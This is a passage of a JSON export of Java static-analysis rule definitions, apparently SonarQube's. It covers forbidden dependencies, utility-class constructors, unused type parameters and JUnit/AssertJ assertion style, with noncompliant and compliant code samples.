            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3417",
            "repo": "java",
            "name": "Track uses of disallowed dependencies",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Whether they are disallowed locally for security, license, or dependability reasons, forbidden dependencies should not be used. </p>\n<p>This rule raises an issue when the group or artifact id of a direct dependency matches the configured forbidden dependency pattern. </p>\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter of: <code>*:.*log4j.*</code></p>\n<pre>\n&lt;dependency&gt; &lt;!-- Noncompliant --&gt;\n    &lt;groupId&gt;log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j&lt;/artifactId&gt;\n    &lt;version&gt;1.2.17&lt;/version&gt;\n&lt;/dependency&gt;\n</pre>",
            "mdDesc": "<p>Whether they are disallowed locally for security, license, or dependability reasons, forbidden dependencies should not be used. </p>\n<p>This rule raises an issue when the group or artifact id of a direct dependency matches the configured forbidden dependency pattern. </p>\n<h2>Noncompliant Code Example</h2>\n<p>With a parameter of: <code>*:.*log4j.*</code></p>\n<pre>\n&lt;dependency&gt; &lt;!-- Noncompliant --&gt;\n    &lt;groupId&gt;log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j&lt;/artifactId&gt;\n    &lt;version&gt;1.2.17&lt;/version&gt;\n&lt;/dependency&gt;\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": true,
            "tags": [],
            "sysTags": [
                "maven"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "dependencyName",
                    "htmlDesc": "Pattern describing forbidden dependencies group and artifact ids. E.G. '<code>*:.*log4j</code>' or '<code>x.y:*</code>'",
                    "type": "STRING"
                },
                {
                    "key": "version",
                    "htmlDesc": "Dependency version pattern or dash-delimited range. Leave blank for all versions. E.G. '<code>1.3.*</code>', '<code>1.0-3.1</code>', '<code>1.0-*</code>' or '<code>*-3.1</code>'",
                    "type": "STRING"
                }
            ],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1118",
            "repo": "java",
            "name": "Utility classes should not have public constructors",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can\nbe extended, should not have public constructors.</p>\n<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor\nshould be defined.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass StringUtils { // Noncompliant\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass StringUtils { // Compliant\n\n  private StringUtils() {\n    throw new IllegalStateException(\"Utility class\");\n  }\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this\nrule.</p>",
            "mdDesc": "<p>Utility classes, which are collections of <code>static</code> members, are not meant to be instantiated. Even abstract utility classes, which can\nbe extended, should not have public constructors.</p>\n<p>Java adds an implicit public constructor to every class which does not define at least one explicitly. Hence, at least one non-public constructor\nshould be defined.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass StringUtils { // Noncompliant\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass StringUtils { // Compliant\n\n  private StringUtils() {\n    throw new IllegalStateException(\"Utility class\");\n  }\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>When class contains <code>public static void main(String[] args)</code> method it is not considered as utility class and will be ignored by this\nrule.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "design"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2326",
            "repo": "java",
            "name": "Unused type parameters should be removed",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Type parameters that aren't used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type\nparameters should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored\n{\n  return a + b;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint Add(int a, int b)\n{\n  return a + b;\n}\n</pre>",
            "mdDesc": "<p>Type parameters that aren't used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type\nparameters should be removed.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nint &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored\n{\n  return a + b;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint Add(int a, int b)\n{\n  return a + b;\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "unused"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S3415",
            "repo": "java",
            "name": "Assertion arguments should be passed in the correct order",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The standard assertions library methods such as <code>org.junit.Assert.assertEquals</code>, and <code>org.junit.Assert.assertSame</code> expect the\nfirst argument to be the expected value and the second argument to be the actual value. For AssertJ, it's the other way around, the argument of\n<code>org.assertj.core.api.Assertions.assertThat</code> is the actual value, and the subsequent calls contain the expected values. Swap them, and your\ntest will still have the same outcome (succeed/fail when it should) but the error messages will be confusing. </p>\n<p>This rule raises an issue when the actual argument to an assertions library method is a hard-coded value and the expected argument is not.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> <a href=\"https://assertj.github.io/doc/\">AssertJ</a> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\norg.junit.Assert.assertEquals(runner.exitCode(), 0, \"Unexpected exit code\");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.\norg.assertj.core.api.Assertions.assertThat(0).isEqualTo(runner.exitCode()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\norg.junit.Assert.assertEquals(0, runner.exitCode(), \"Unexpected exit code\");\norg.assertj.core.api.Assertions.assertThat(runner.exitCode()).isEqualTo(0);\n</pre>",
            "mdDesc": "<p>The standard assertions library methods such as <code>org.junit.Assert.assertEquals</code>, and <code>org.junit.Assert.assertSame</code> expect the\nfirst argument to be the expected value and the second argument to be the actual value. For AssertJ, it's the other way around, the argument of\n<code>org.assertj.core.api.Assertions.assertThat</code> is the actual value, and the subsequent calls contain the expected values. Swap them, and your\ntest will still have the same outcome (succeed/fail when it should) but the error messages will be confusing. </p>\n<p>This rule raises an issue when the actual argument to an assertions library method is a hard-coded value and the expected argument is not.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> <a href=\"https://assertj.github.io/doc/\">AssertJ</a> </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\norg.junit.Assert.assertEquals(runner.exitCode(), 0, \"Unexpected exit code\");  // Noncompliant; Yields error message like: Expected:&lt;-1&gt;. Actual:&lt;0&gt;.\norg.assertj.core.api.Assertions.assertThat(0).isEqualTo(runner.exitCode()); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\norg.junit.Assert.assertEquals(0, runner.exitCode(), \"Unexpected exit code\");\norg.assertj.core.api.Assertions.assertThat(runner.exitCode()).isEqualTo(0);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "suspicious",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "2min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "2min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "2min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "2min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5838",
            "repo": "java",
            "name": "Chained AssertJ assertions should be simplified to the corresponding dedicated assertion",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>AssertJ contains many assertions methods specific to common types. Both versions will test the same things, but the dedicated one will provide a\nbetter error message, simplifying the debugging process.</p>\n<p>This rule reports an issue when an assertion can be simplified to a dedicated one.</p>\n<p>The array below gives a non-exhaustive list of assertion reported by the rule. Code behaving similarly, or with a negation will also be\nreported.</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Original</th>\n      <th>Dedicated</th>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to Object</th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getObject()).isEqualTo(null)</code></td>\n      <td><code>assertThat(getObject()).isNull()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getBoolean()).isEqualTo(true)</code></td>\n      <td><code>assertThat(getBoolean()).isTrue()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getBoolean()).isEqualTo(false)</code></td>\n      <td><code>assertThat(getBoolean()).isFalse()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.equals(y)).isTrue()</code></td>\n      <td><code>assertThat(x).isEqualTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x == y).isTrue()</code></td>\n      <td><code>assertThat(x).isSameAs(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x == null).isTrue()</code></td>\n      <td><code>assertThat(x).isNull()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.toString()).isEqualTo(y)</code></td>\n      <td><code>assertThat(x).hasToString(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.hashCode()).isEqualTo(y.hashCode())</code></td>\n      <td><code>assertThat(x).hasSameHashCodeAs(y));</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getObject() instanceof MyClass).isTrue()</code></td>\n      <td><code>assertThat(getObject()).isInstanceOf(MyClass.class)</code></td>\n    </tr>\n    <tr>\n      <th>Related to <code>Comparable</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.compareTo(y)).isZero()</code></td>\n      <td><code>assertThat(x).isEqualByComparingTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &gt;= y).isGreaterThanOrEqualTo(0)</code></td>\n      <td><code>assertThat(x).isGreaterThanOrEqualTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &gt; y).isPositive()</code></td>\n      <td><code>assertThat(x).isGreaterThan(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &lt;= y).isNotPositive()</code></td>\n      <td><code>assertThat(x).isLessThanOrEqualTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &lt; y).isTrue()</code></td>\n      <td><code>assertThat(x).isLessThan(y)</code></td>\n    </tr>\n    <tr>\n      <th>Related to <code>String</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().isEmpty()).isTrue()</code></td>\n      <td><code>assertThat(getString()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(</code><code>getString</code><code>()).hasSize(0)</code></td>\n      <td><code>assertThat(</code><code>getString</code><code>()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().equals(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).isEqualTo(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().equalsIgnoreCase(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).isEqualToIgnoringCase(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().contains(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).contains(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().startsWith(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).startsWith(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().endsWith(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).endsWith(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().matches(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).matches(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().trim()).isEmpty()</code></td>\n      <td><code>assertThat(getString()).isBlank()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().length()).isEqualTo(length)</code></td>\n      <td><code>assertThat(getString()).hasSize(length)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().length()).hasSize(expected.length())</code></td>\n      <td><code>assertThat(getString()).hasSameSizeAs(expected)</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>File</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile()).hasSize(0)</code></td>\n      <td><code>assertThat(getFile()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().length()).isZero()</code></td>\n      <td><code>assertThat(getFile()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().length()).isEqualTo(length)</code></td>\n      <td><code>assertThat(getFile()).hasSize(length)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().canRead()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).canRead()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().canWrite()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).canWrite()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().exists()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).exists()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().getName()).isEqualTo(name)</code></td>\n      <td><code>assertThat(getFile()).hasName(name)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().getParent()).isEqualTo(pathname)</code></td>\n      <td><code>assertThat(getFile()).hasParent(pathname)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().getParentFile()).isNull()</code></td>\n      <td><code>assertThat(getFile()).hasNoParent()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isAbsolute()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).isAbsolute()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isAbsolute()).isFalse()</code></td>\n      <td><code>assertThat(getFile()).isRelative()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isDirectory()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).isDirectory()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isFile()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).isFile()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().list()).isEmpty()</code></td>\n      <td><code>assertThat(getFile()).isEmptyDirectory()</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Path</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().startsWith(path)).isTrue()</code></td>\n      <td><code>assertThat(getPath()).startsWithRaw(path)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().endsWith(path)).isTrue()</code></td>\n      <td><code>assertThat(getPath()).endsWithRaw(path)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().getParent()).isEqualTo(name)</code></td>\n      <td><code>assertThat(getPath()).hasParentRaw(name)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().getParent()).isNull()</code></td>\n      <td><code>assertThat(getPath()).hasNoParentRaw()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().isAbsolute()).isTrue()</code></td>\n      <td><code>assertThat(getPath()).isAbsolute()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().isAbsolute()).isFalse()</code></td>\n      <td><code>assertThat(getPath()).isRelative()</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Array</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isZero()</code></td>\n      <td><code>assertThat(getArray()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isEqualTo(length)</code></td>\n      <td><code>assertThat(getArray()).hasSize(length)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isEqualTo(anotherArray.length)</code></td>\n      <td><code>assertThat(getArray()).hasSameSizeAs(getAnotherArray())</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isLessThanOrEqualTo(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeLessThanOrEqualTo(expression)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isLessThan(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeLessThan(expression)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isGreaterThan(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeGreaterThan(expression)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getArray().length).isGreaterThanOrEqualTo(expression)</code></td>\n      <td><code>assertThat(getArray()).hasSizeGreaterThanOrEqualTo(expression)</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Collection</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().isEmpty()).isTrue()</code></td>\n      <td><code>assertThat(getCollection()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().size()).isZero()</code></td>\n      <td><code>assertThat(getCollection()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().contains(something)).isTrue()</code></td>\n      <td><code>assertThat(getCollection()).contains(something)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getCollection().containsAll(otherCollection)).isTrue()</code></td>\n      <td><code>assertThat(getCollection()).containsAll(otherCollection)</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Map</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().size()).isEqualTo(otherMap().size()</code></td>\n      <td><code>assertThat(getMap()).hasSameSizeAs(otherMap())</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().containsKey(key)).isTrue()</code></td>\n      <td><code>assertThat(getMap()).containsKey(key)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().keySet()).contains(key)</code></td>\n      <td><code>assertThat(getMap()).containsKey(key)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().keySet()).containsOnlyKey(key)</code></td>\n      <td><code>assertThat(getMap()).containsOnlyKey(key)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().containsValue(value)).isTrue()</code></td>\n      <td><code>assertThat(getMap()).containsValue(value)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().values()).contains(value)</code></td>\n      <td><code>assertThat(getMap()).containsValue(</code><code>value</code><code>)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getMap().get(key)).isEqualTo(value)</code></td>\n      <td><code>assertThat(getMap()).containsEntry(key, value)</code></td>\n    </tr>\n    <tr>\n      <th>Related to <code>Optional</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getOptional().isPresent()).isTrue()</code></td>\n      <td><code>assertThat(getOptional()).isPresent()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getOptional().get()).isEqualTo(something)</code></td>\n      <td><code>assertThat(getOptional()).contains(something)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getOptional().get()).isSameAs(something)</code></td>\n      <td><code>assertThat(getOptional()).containsSame(something)</code></td>\n    </tr>\n  </tbody>\n</table>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(getObject()).isEqualTo(null); // Noncompliant\nassertThat(getObject()).isNotEqualTo(null); // Noncompliant - not listed above but also supported\n\nassertThat(getString().trim()).isEmpty();\nassertThat(getFile().canRead()).isTrue();\nassertThat(getPath().getParent()).isNull();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(getObject()).isNull();\n\nassertThat(getString()).isBlank();\nassertThat(getFile()).canRead();\nassertThat(getPath()).hasNoParentRaw();\n</pre>",
            "mdDesc": "<p>AssertJ contains many assertions methods specific to common types. Both versions will test the same things, but the dedicated one will provide a\nbetter error message, simplifying the debugging process.</p>\n<p>This rule reports an issue when an assertion can be simplified to a dedicated one.</p>\n<p>The array below gives a non-exhaustive list of assertion reported by the rule. Code behaving similarly, or with a negation will also be\nreported.</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Original</th>\n      <th>Dedicated</th>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to Object</th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getObject()).isEqualTo(null)</code></td>\n      <td><code>assertThat(getObject()).isNull()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getBoolean()).isEqualTo(true)</code></td>\n      <td><code>assertThat(getBoolean()).isTrue()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getBoolean()).isEqualTo(false)</code></td>\n      <td><code>assertThat(getBoolean()).isFalse()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.equals(y)).isTrue()</code></td>\n      <td><code>assertThat(x).isEqualTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x == y).isTrue()</code></td>\n      <td><code>assertThat(x).isSameAs(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x == null).isTrue()</code></td>\n      <td><code>assertThat(x).isNull()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.toString()).isEqualTo(y)</code></td>\n      <td><code>assertThat(x).hasToString(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.hashCode()).isEqualTo(y.hashCode())</code></td>\n      <td><code>assertThat(x).hasSameHashCodeAs(y));</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getObject() instanceof MyClass).isTrue()</code></td>\n      <td><code>assertThat(getObject()).isInstanceOf(MyClass.class)</code></td>\n    </tr>\n    <tr>\n      <th>Related to <code>Comparable</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(x.compareTo(y)).isZero()</code></td>\n      <td><code>assertThat(x).isEqualByComparingTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &gt;= y).isGreaterThanOrEqualTo(0)</code></td>\n      <td><code>assertThat(x).isGreaterThanOrEqualTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &gt; y).isPositive()</code></td>\n      <td><code>assertThat(x).isGreaterThan(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &lt;= y).isNotPositive()</code></td>\n      <td><code>assertThat(x).isLessThanOrEqualTo(y)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(x &lt; y).isTrue()</code></td>\n      <td><code>assertThat(x).isLessThan(y)</code></td>\n    </tr>\n    <tr>\n      <th>Related to <code>String</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().isEmpty()).isTrue()</code></td>\n      <td><code>assertThat(getString()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(</code><code>getString</code><code>()).hasSize(0)</code></td>\n      <td><code>assertThat(</code><code>getString</code><code>()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().equals(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).isEqualTo(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().equalsIgnoreCase(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).isEqualToIgnoringCase(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().contains(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).contains(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().startsWith(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).startsWith(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().endsWith(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).endsWith(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().matches(expected)).isTrue()</code></td>\n      <td><code>assertThat(getString()).matches(expected)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().trim()).isEmpty()</code></td>\n      <td><code>assertThat(getString()).isBlank()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().length()).isEqualTo(length)</code></td>\n      <td><code>assertThat(getString()).hasSize(length)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getString().length()).hasSize(expected.length())</code></td>\n      <td><code>assertThat(getString()).hasSameSizeAs(expected)</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>File</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile()).hasSize(0)</code></td>\n      <td><code>assertThat(getFile()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().length()).isZero()</code></td>\n      <td><code>assertThat(getFile()).isEmpty()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().length()).isEqualTo(length)</code></td>\n      <td><code>assertThat(getFile()).hasSize(length)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().canRead()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).canRead()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().canWrite()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).canWrite()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().exists()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).exists()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().getName()).isEqualTo(name)</code></td>\n      <td><code>assertThat(getFile()).hasName(name)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().getParent()).isEqualTo(pathname)</code></td>\n      <td><code>assertThat(getFile()).hasParent(pathname)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().getParentFile()).isNull()</code></td>\n      <td><code>assertThat(getFile()).hasNoParent()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isAbsolute()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).isAbsolute()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isAbsolute()).isFalse()</code></td>\n      <td><code>assertThat(getFile()).isRelative()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isDirectory()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).isDirectory()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().isFile()).isTrue()</code></td>\n      <td><code>assertThat(getFile()).isFile()</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getFile().list()).isEmpty()</code></td>\n      <td><code>assertThat(getFile()).isEmptyDirectory()</code></td>\n    </tr>\n    <tr>\n      <th>&nbsp;Related to <code>Path</code></th>\n      <th>&nbsp;</th>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().startsWith(path)).isTrue()</code></td>\n      <td><code>assertThat(getPath()).startsWithRaw(path)</code></td>\n    </tr>\n    <tr>\n      <td><code>assertThat(getPath().endsWith(path)).isTrue()</code></td>\n      